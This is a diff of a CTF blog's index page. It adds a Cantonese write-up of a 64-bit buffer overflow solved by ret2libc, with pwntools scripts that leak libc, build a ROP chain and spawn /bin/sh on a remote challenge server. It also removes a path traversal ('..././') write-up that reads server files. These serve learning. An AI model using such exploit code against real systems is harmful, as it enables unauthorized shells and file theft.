@@ -61,6 +61,71 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-VxCTF2018-BabySanity" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/12/VxCTF2018-BabySanity/" class="article-date">
+  <time datetime="2018-05-11T17:13:16.000Z" itemprop="datePublished">2018-05-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/12/VxCTF2018-BabySanity/">VxCTF2018-BabySanity</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="sanity">sanity</a><br><a href="libc-2.23.so">libc-2.23.so</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎</p>
+<p>首先啦 , 基本動作 checksec先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:    amd64-64-little</span><br><span class="line">RELRO:   Partial RELRO</span><br><span class="line">Stack:   No canary found</span><br><span class="line">NX:      NX enabled</span><br><span class="line">PIE:     No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>之後扔入IDA睇下個Main先<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [sp+10h] [bp-70h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Sanity Check should be easy"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>睇落好似無乜野好簡單咁 , 但係其實都真係幾難<br>首先啦佢開左ALSR , 所以每次加載個.so入黎果時個base address都唔同<br>所以要做以下既步驟</p>
+<ol>
+<li>leak 是但一個 libc function既address出黎</li>
+<li>拎番 libc 果個function既offset , 再將 offset減leaked function address 就有個 libc base address , 所拎到之後只需要係libc到拎function , 再加番 libc base address , 就可以係ASLR既環境下做到function call.</li>
+<li>拎番 libc system個offset , 同埋 /bin/sh呢條string既offset</li>
+<li>搵v4 overflow果個offset , 就咁睇應該係0x70 , 而要+8係因為x64 , 每個地址係8bytes長</li>
+<li>順序將 got , plt 既puts 壓番入main , 咁就會行多次Main , 行plt既puts print 番 got既puts address出黎</li>
+<li>然後就可以構做多次buffer overflow , 再做番ROP.</li>
+</ol>
+<h3 id="Leak-Function-Address"><a href="#Leak-Function-Address" class="headerlink" title="Leak Function Address"></a>Leak Function Address</h3><p>首先試下點樣可以 trigger main行多次先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(<span class="number">0x401000</span>) <span class="comment">#just for fill rdi</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>可以見到已經行左2次 , 咁如果我地將0x401000轉做一個function既地址會點?<br>最終係可以構做到變成puts(gotAddress)<br>例如想leak libc既main 可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(__libc_start_main_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">有堆亂碼 , 應該係address既hex string黎</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>咁我地試下leak puts既address啦 , 搵offset都方便d<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> leaked.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">90afab45ad7f0a</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>咁個puts address應該係7fad45abaf90 , 但係多左個0a又調轉左喎 , 咁format下佢 , 同埋計番個libc_base先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">leaked = u64(leaked[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base = leaked - libc_puts_off</span><br><span class="line">info(<span class="string">"Libc base:"</span> + hex(libc_base))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">[*] Libc base: 0x7f28573b5900</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>咁之後就可以慢慢拎番 binsh 既offset 同埋system既offset , 加番libc base , 再做ROP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_system_off = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_binsh_offset = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br></pre></td></tr></table></figure></p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><ol>
+<li><p>Buffer overflow</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern create 200 input</span><br><span class="line">r &lt; input</span><br><span class="line">pattern search</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搵ROPgadget (pop rdi; ret;)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary sanity --only &apos;pop|ret&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>砌積木</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer + gadget + binsh_addr + system_addr</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="Full-exploit-code"><a href="#Full-exploit-code" class="headerlink" title="Full exploit code"></a>Full exploit code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./sanity")</span></span><br><span class="line">p = remote(<span class="string">"35.185.151.73"</span>,<span class="number">8044</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>) </span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">libc_system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">libc_binsh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">gadget = <span class="number">0x4006a3</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"libc system offset: "</span> + hex(libc_system_off))</span><br><span class="line">info(<span class="string">"libc /bin/sh offset: "</span> + hex(libc_binsh_offset))</span><br><span class="line">info(<span class="string">"libc puts offset: "</span> + hex(libc_puts_off))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Sanity Check should be easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">leaked = u64(leaked[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = leaked - libc_puts_off</span><br><span class="line"></span><br><span class="line">info(<span class="string">"leaked puts: "</span> + hex(leaked))</span><br><span class="line">info(<span class="string">"libc base: "</span> + hex(libc_base_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(libc_base_addr + libc_binsh_offset)</span><br><span class="line">payload += p64(libc_base_addr + libc_system_off)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/" data-id="cjh2a68h6000irsw5ca41qqlu" class="article-share-link">Teilen</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-ASISCTF2018-LeftOrRight" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/05/01/ASISCTF2018-LeftOrRight/" class="article-date">
@@ -98,7 +163,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/05/01/ASISCTF2018-LeftOrRight/" data-id="cjgnuburi0001zww5qwzfbxnd" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/05/01/ASISCTF2018-LeftOrRight/" data-id="cjh2a68g90001rsw5h3874ay6" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -136,7 +201,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/05/01/ASISCTF2018-WarmUp/" data-id="cjgnuburk0002zww5xd8cgr56" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/05/01/ASISCTF2018-WarmUp/" data-id="cjh2a68h5000hrsw5hd2laqgb" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -176,7 +241,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/05/01/ASISCTF2018-TheEarlySchool/" data-id="cjgnubure0000zww56362nq3j" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/05/01/ASISCTF2018-TheEarlySchool/" data-id="cjh2a68g50000rsw5qkghspe6" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -216,7 +281,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Pshchology/" data-id="cjgnubus6000izww5hjc369lk" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Pshchology/" data-id="cjh2a68h7000jrsw5ra2r2mm3" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -256,7 +321,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-ForeignLanguage/" data-id="cjgnubus4000gzww5mpdhfava" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-ForeignLanguage/" data-id="cjh2a68h4000grsw56pdxprfa" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -294,7 +359,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Attendance/" data-id="cjgnubus2000ezww516qezwhy" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Attendance/" data-id="cjh2a68gw000drsw52y5sfztz" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -334,7 +399,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-cparty/" data-id="cjgnubusm000kzww5a0edue6g" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-cparty/" data-id="cjh2a68h9000lrsw5huuimagd" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -373,7 +438,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/" data-id="cjgnubus5000hzww5qjgdwwh9" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/" data-id="cjh2a68gy000frsw58ie86zi9" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -413,54 +478,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Squirrels/" data-id="cjgnubus6000jzww5mxvx9xxl" class="article-share-link">Teilen</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-TimisoaraCTF2018-BookDir1-2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/22/TimisoaraCTF2018-BookDir1-2/" class="article-date">
-  <time datetime="2018-04-22T13:49:36.000Z" itemprop="datePublished">2018-04-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/22/TimisoaraCTF2018-BookDir1-2/">TimisoaraCTF2018-BookDir1-2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="http://89.38.210.129:8012" target="_blank" rel="noopener">http://89.38.210.129:8012</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="BookDir2"><a href="#BookDir2" class="headerlink" title="BookDir2"></a>BookDir2</h3><p>第一步入去睇source見到有個js file, 似乎係用黎裝住client side既core logic.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bookTemplate = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;div class="col-lg-4 col-sm-6 text-center mb-4"&gt;</span></span><br><span class="line"><span class="string">  &lt;h3&gt;%NAME%&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;%MESSAGE%&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bookMessages = [</span><br><span class="line">    <span class="string">'A great book indeed!'</span>,</span><br><span class="line">    <span class="string">'Best content you can get out there.'</span>,</span><br><span class="line">    <span class="string">'Best-seller &amp; #1 10 times in a row.'</span>,</span><br><span class="line">    <span class="string">'Featured and recommended by us.'</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'booklist.php'</span>,</span><br><span class="line">    dataType: <span class="string">'json'</span>,</span><br><span class="line">    type: <span class="string">'GET'</span>,</span><br><span class="line">    headers: &#123;<span class="string">'X-Dir'</span>: <span class="string">'.'</span>&#125;,</span><br><span class="line">    success: <span class="function">(<span class="params">books</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> container = $(<span class="string">'#books'</span>);</span><br><span class="line">        books.forEach(<span class="function"><span class="params">book</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// let message = bookMessages[Math.floor(Math.random() * bookMessages.length)];</span></span><br><span class="line">            $.getJSON(<span class="string">'booklist.php?f='</span> + book.name, message =&gt; &#123;</span><br><span class="line">                container.append(bookTemplate.replace(<span class="regexp">/%NAME%/g</span>, book.name).replace(<span class="regexp">/%MESSAGE%/g</span>, message));</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>呢段script就咁睇似乎 booklist.php 係用黎拎book list既 , 咁佢需要既野正係得 X-Dir , 或者個X-Dir係用黎控制係邊個directory拎野?<br>正常request過去睇下咩黎架先<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">"name"</span>:<span class="string">"Beloved"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Catch-22"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Lolita"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Nineteen Eighty-Four"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Catcher in the Rye"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Grapes of Wrath"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Great Gatsby"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"The Sound and the Fury"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Ulysses"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
-<p>咁試下改佢做 ../ 再request睇下先<br>果然拎番黎既結果唔同左<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">"name"</span>:<span class="string">"4o4_fl4g_n0t_f0und.php"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"booklist.php"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"books.js"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"css"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"index.html"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"list"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"vendor"</span>&#125;]</span><br></pre></td></tr></table></figure></p>
-<p>咁而家要做既野應該就係諗方法點讀個 4o4_fl4g_n0t_f0und.php<br>睇番條javascript, 原來booklist.php仲可以收個f variable, 咁就睇應該係個filename<br>直接試下入f=4o4_fl4g_n0t_f0und.php先 , 不過發現原來係唔work既<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">false</span><br></pre></td></tr></table></figure></p>
-<p>咁試下入番正常書名先 f=Beloved<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\&quot;124 was spiteful. Full of baby&apos;s venom. The women in the house knew it and so did the children.\&quot;\n&quot;</span><br></pre></td></tr></table></figure></p>
-<p>發現又回到野喎 , 咁可能個X-Dir應該正係用黎list directory , 真正讀file果下應該set死左係list個folder到<br>咁既話應該可以 f=../4o4_fl4g_n0t_f0und.php 黎讀番上一層個file , 不過發現都係fail左<br>有機會係套source直接將../ replace左之類 , 咁唯有試下 …/./4o4_fl4g_n0t_f0und.php 啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n\/\/ timctf&#123;f0und_f1rst_p4rt___wh4t_n3xt&#125;\n\n\/\/ Can you get the second part? :^)\n&quot;</span><br></pre></td></tr></table></figure></p>
-<h3 id="BookDir"><a href="#BookDir" class="headerlink" title="BookDir"></a>BookDir</h3><p>承上題我地可以任意讀file之後 , 咁就順手讀埋 booklist.php睇下有冇flag啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n\n$headers = getallheaders();\n\nfunction waf($str) &#123;\n    return str_replace(&apos;..\/&apos;, &apos;&apos;, $str);\n&#125;\n\nif (isset($_GET[&apos;f&apos;])) &#123;\n    ini_set(&apos;open_basedir&apos;, &apos;\/var\/www\/site\/&apos;);\n    \/\/ ^ I wonder why that is.. ?\n\n    echo json_encode(file_get_contents(&apos;list\/&apos; . waf($_GET[&apos;f&apos;])));\n&#125; else &#123;\n    ini_set(&apos;open_basedir&apos;, &apos;\/var\/www\/site\/books\/&apos;);\n\n    $dir = &apos;.&apos;;\n    if (isset($headers[&apos;X-Dir&apos;])) &#123;\n        $dir = $headers[&apos;X-Dir&apos;]; \/\/ waf()? might be too easy for the first stage :^)\n\n        \/\/ artificial hack to check for \/ as last char after replacement\n        if ($dir[strlen($dir) - 1] !== &apos;\/&apos;) &#123;\n            $dir = &apos;.&apos;;\n        &#125;\n    &#125;\n\n    $files = [];\n    foreach (array_diff(scandir(&apos;list\/&apos; . $dir), [&apos;..&apos;, &apos;.&apos;]) as $file) &#123;\n        $files[] = [&apos;name&apos; =&gt; $file];\n    &#125;\n\n    echo json_encode($files);\n&#125;\n&quot;</span><br></pre></td></tr></table></figure></p>
-<p>結果係無既 , 咁順手試埋再上一層個.htaccess先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;Files .htaccess&gt;\n  Order allow,deny\n  Deny from all\n&lt;\/Files&gt;\n\n&lt;Files w0w_y0u_g0t_m3___.php&gt;\n  Order allow,deny\n  Deny from all\n&lt;\/Files&gt;\n\nRewriteEngine On\nRewriteRule ^(?:books\/list)\\b.* \/403.php\n&quot;</span><br></pre></td></tr></table></figure></p>
-<p>發現左root directory 有個file叫w0w_y0u_g0t<em>m3__</em>.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n\n\/\/ timctf&#123;b0Ok5_4r3_4m4z1ng&#125;\necho &apos;c0ngr4ts!&apos;;\n&quot;</span><br></pre></td></tr></table></figure></p>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>BookDir: timctf{b0Ok5_4r3_4m4z1ng}<br>BookDir2: timctf{f0und_f1rst_p4rt___wh4t_n3xt}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-BookDir1-2/" data-id="cjgnubus3000fzww506hcdzm8" class="article-share-link">Teilen</a>
